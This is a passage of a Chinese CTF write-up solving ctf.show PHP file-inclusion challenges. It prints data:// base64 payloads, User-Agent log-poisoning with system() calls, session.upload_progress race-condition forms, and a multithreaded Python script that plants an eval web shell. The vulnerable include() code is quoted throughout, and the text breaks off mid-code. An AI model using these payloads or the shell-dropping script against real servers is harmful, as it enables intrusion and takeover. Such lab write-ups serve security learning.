+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/e10df877d7eb485bba25104c4ab8ed1b.png" alt="在这里插入图片描述"><br>发现flag在fl0g.php中，我们更改post内容即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;tac fl0g.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/e9c74cc08ef84612b11b7a3ead48f787.png" alt="在这里插入图片描述"></p>
+<h3><span id="0x04">0X04</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>这个的话我们可以利用data伪协议进行绕过，构造payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD89IGBjYXQgZioucGhwYDs/Pg</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/93e55ab5077844b4a397f68b6b45b6f4.png" alt="在这里插入图片描述"><br>其实语句本来是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本来是data:<span class="comment">//text/plain;base64,PD89IGBjYXQgZioucGhwYDs/Pg==</span></span><br><span class="line">但过滤了=，因此把=删去</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/a876467fdbb04376b3bc9dd2da135495.png" alt="在这里插入图片描述"><br>把等号删去此时还有分号，有分号语句就可以执行，本地测试如下<br><img src="https://img-blog.csdnimg.cn/b73e7166d7ac4ed9b565a244873bd6e3.png" alt="在这里插入图片描述"></p>
+<h2><span id="文件包含日志包含类">文件包含（日志包含类）</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3><span id="0x01">0X01</span></h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。  利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>知道服务器的日志位置，我们可以去包含这个文件从而拿到shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache一般是/<span class="keyword">var</span>/log/apache/access.log。</span><br><span class="line">nginx的log在/<span class="keyword">var</span>/log/nginx/access.log和/<span class="keyword">var</span>/log/nginx/<span class="built_in">error</span>.log</span><br></pre></td></tr></table></figure>
+<p>我们试着访问日志文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2f5d1ee1a4f64190b7a8f10229b13d0b.png" alt="在这里插入图片描述"><br>成功访问到了，我们发现user-agent的信息出来了，因此我们可以利用user-agent植入语句从而获取flag，具体操作如下<br>开启bp，修改get信息为日志路径<code>?file=/var/log/nginx/access.log</code>，修改ua为<code>&lt;?php system(&#39;ls&#39;);?&gt;</code>,执行结果如下<br><img src="https://img-blog.csdnimg.cn/850780230103436592fa84b20dcdc203.png" alt="在这里插入图片描述"><br>发现flag在fl0g.php中，此时我们修改ua为<code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code>，执行结果如下<br><img src="https://img-blog.csdnimg.cn/17e10d55bb6148c385a9b998ce07b542.png" alt="在这里插入图片描述"></p>
+<h3><span id="0x02">0X02</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同上关类似，但本关过滤了<code>:</code>因此我们无法再使用伪协议，但仍可以借助日志包含漏洞来进行<br>构造payload如下即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p>同时修改ua为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;cat flag.php&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/4209cfa1502f47bba0675266184e025e.png" alt="在这里插入图片描述"></p>
+<h2><span id="文件包含实战条件竞争">文件包含实战（条件竞争）</span></h2><h3><span id="0x01">0X01</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>本关把<code>.</code>给ban了，那么只能够利用无后缀的文件，众所周知php中只有session文件是无后缀的，因此我们需要构造一个session文件，再用<code>session.upload_progress</code>将木马写入session文件，设置cookie可以自动初始化session文件，设置<code>cookie:PHPSESSID=flag</code>php就会在服务器上创建一个文件<code>/tmp/sess_flag</code>，这个文件的键值是<code>ini.get(&quot;session.upload_progress.prefix&quot;)</code>+由我们构造的<code>session.upload_progress.name</code>值组成，最后被写到session中，那我们在<code>PHP_SESSION_UPLOAD_PROGRESS</code>中编写我们的恶意语句，就成功的写到了session中，我们的session文件是有了，但是接下来看这些php内置函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">session.auto_start = off</span><br><span class="line"><span class="comment">// 如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是关闭的</span></span><br><span class="line">session.upload_progress.enabled = on</span><br><span class="line"><span class="comment">// 默认开启这个选项，表示upload_progress功能开始，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</span></span><br><span class="line">session.upload_progress.cleanup = on</span><br><span class="line"><span class="comment">// 默认开启这个选项，表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要。</span></span><br><span class="line">session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment">// 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时（这部分数据用户可控），上传进度可以在SESSION中获得。当PHP检测到这种POST请求时，它会在SESSION中添加一组数据（系统自动初始化session）, 索引是session.upload_progress.prefix与session.upload_progress.name连接在一起的值。</span></span><br><span class="line">session.upload_progress.freq = <span class="string">&quot;1%&quot;</span></span><br><span class="line">session.upload_progress.min_freq = <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="comment">// session.upload_progress.freq = &quot;1%&quot;+session.upload_progress.min_freq = &quot;1&quot;：选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。</span></span><br></pre></td></tr></table></figure>
+<p>当<code>session.upload_progress.cleanup = on</code>开启时，文件上传完会立即清除session文件中的内容，我们该怎么办呢，这时候就用到了文件竞争，一个POST传session，一个GET对session文件进行请求，两者同时进行就可以达到我们的目的，构造表单如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://9cb9ab98-2b0a-4259-98b1-fb1902156765.challenge.ctf.show/&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>随便传入个文件(为了配合PHP_SESSION_UPLOAD_PROGRESS)，然后抓包，修改cookie为PHPSESSID=flag，控制session文件名<br><img src="https://img-blog.csdnimg.cn/4a0fa225e5084e76be5f0537a3a7305d.png" alt="在这里插入图片描述">随便设置一个变量，要不然无法执行爆破<br>发送到爆破模块，在<code>PHP_SESSION_UPLOAD_PROGRESS</code>下写入我们的恶意语句，此时设置payload为<code>null payloads</code>模式<img src="https://img-blog.csdnimg.cn/d106c76c9f4443079abf490a493780ce.png" alt="在这里插入图片描述">再抓一个靶场包，设置文件路径为<code>tmp/sess_flag</code>，在下方随便设置一个变量，方便爆破，payload设置同上，然后两个同时开启爆破，即可获取我们恶意语句的结果</p>
+<p><img src="https://img-blog.csdnimg.cn/6b9088b4e3884f24a8dac7fd0ac35c16.png" alt="在这里插入图片描述"></p>
+<h3><span id="0x02">0X02</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Warning: session_destroy(): Trying to destroy uninitialized session in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>本关进去就提示了要求摧毁未初始化session的警告，我们发现相比上关多了两个函数，对函数介绍如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> session_unset()</span><br><span class="line">释放当前在内存中已经创建的所有<span class="variable">$_SESSION</span>变量，但不删除session文件以及不释放对应的session</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">session_destroy()</span><br><span class="line">删除当前用户对应的session文件以及释放session</span><br></pre></td></tr></table></figure>
+<p>可以看出这两个是完全将session给删除了，那我们只需要在表单构造时加上session_start()即可创建新的session文件，利用文件竞争同样可以达到目的，表单构造如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://9cb9ab98-2b0a-4259-98b1-fb1902156765.challenge.ctf.show/&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">session_start();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里引用脚本(条件竞争通用)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://e452861c-2e24-45d7-85cb-081b143cf342.challenge.ctf.show:8080/&#x27;</span><span class="comment">#传入url</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span> <span class="comment">#写入2.php文件，文件内容为一句话木马</span></span><br><span class="line">    &#125;</span><br><span class="line">sessionid=<span class="string">&#x27;quan9i&#x27;</span> <span class="comment">#传入session文件名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span> <span class="comment">#自定义写入session文件函数</span></span><br><span class="line">    fileBytes=io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>) <span class="comment">#括号内的b表示后面字符串是bytes类型。这里传入了50kb</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url,</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><span class="comment">#传入的session文件中的内容为一句话木马</span></span><br><span class="line">        &#125;,</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid <span class="comment">#文件名为sessionid，sessionid是quan9i，因此这里的文件名就是quan9i</span></span><br><span class="line">        &#125;,</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;quan9i.jpg&#x27;</span>,fileBytes)<span class="comment">#路径是quan9i.jpg文件，文件大小是50kb</span></span><br><span class="line">        &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="comment">#printf(response)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span><span class="comment">#自定义读取session文件函数</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,cookies=&#123;<span class="comment">#这里写入tmp是为了包含session文件，session文件执行的的是1,1的参数对应的数据是写入文件2.php，文件2.php对应的内容是执行2</span></span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid <span class="comment">#读取路径是tmp/sess_quan9i</span></span><br><span class="line">        &#125;</span><br><span class="line">        )</span><br><span class="line">        response2=session.get(url+<span class="string">&#x27;2.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response2.status_code==<span class="number">200</span>:<span class="comment">#如果返回正常</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++++++++++++++++YES+++++++++++++++++]&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response2.status_code)<span class="comment">#输出状态码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):<span class="comment">#五个进程</span></span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()<span class="comment">#初始化</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    整体思路</span></span><br><span class="line"><span class="string">    首先写入url,我们需要往里面传入数据,所以我们这里data传入一个php文件,传到默认路径下，文件内容为一句话木马，为了</span></span><br><span class="line"><span class="string">    控制session文件名,我们设置sessionid为quan9i,此时开始定义写文件函数,首先需要写入一个在session文件中写入一个文件,大小</span></span><br><span class="line"><span class="string">    设置为50kb即可,之所以要写入文件是为了配合PHP_SESSION_UPLOAD_PROGRESS,这个东西是监测文件上传进度的，如果不传文件的话，</span></span><br><span class="line"><span class="string">    我们啥也监测不了，这个语句就有问题了,然后设置cookie为PHPSESSID=sessionid,</span></span><br><span class="line"><span class="string">    此时sessionid就是我们之前设置的quan9i,这时就确定了session文件的路径是/tmp/sess_quan9i,</span></span><br><span class="line"><span class="string">    此时我们监测的文件还没传，上方写入的文件需要传进去,我们传进去就可以了,此时可以printf(response)来查看响应进而确定是否成功写入文件</span></span><br><span class="line"><span class="string">    此时再自定义读文件,首先post包含我们的session文件,并设置cookie与之前相同,这个目的是为了执行session中的代码,session文件执行的是参数1,参数1在最上方对应</span></span><br><span class="line"><span class="string">    的是写入2.php文件,2.php文件对应的是执行参数2,</span></span><br><span class="line"><span class="string">    如果执行成功就输出+++YES+++,错误时返回状态码</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>为什么脚本可以用，是因为脚本使用了多线程竞争的方法。<br><font color="red">什么是多线程竞争?</font><br>线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:</p>
+<p>数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。</p>
+<p>这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)之间也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。</p>
+<p>参考文章<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120106832">https://blog.csdn.net/qq_46918279/article/details/120106832</a></p>
+<h3><span id="0x03">0X03</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时他多了一个删除/tmp/路径下的文件，且无法找回的语句，但是我们仍然可以利用多线程来进行，这是因为多进程同时进行多个的缘故，我们一边   <code>system(&quot;rm -rf /tmp/*&quot;);</code>， 一边<code>include($file);</code>，两者之间是有间隔的,就会出现一边刚删除完一个session文件，另一个线程创建了一个文件，此时就被包含进去，从而成功执行了我们的恶意语句</p>
+<h3><span id="0x04">0X04</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">define(<span class="string">&#x27;还要秀？&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span 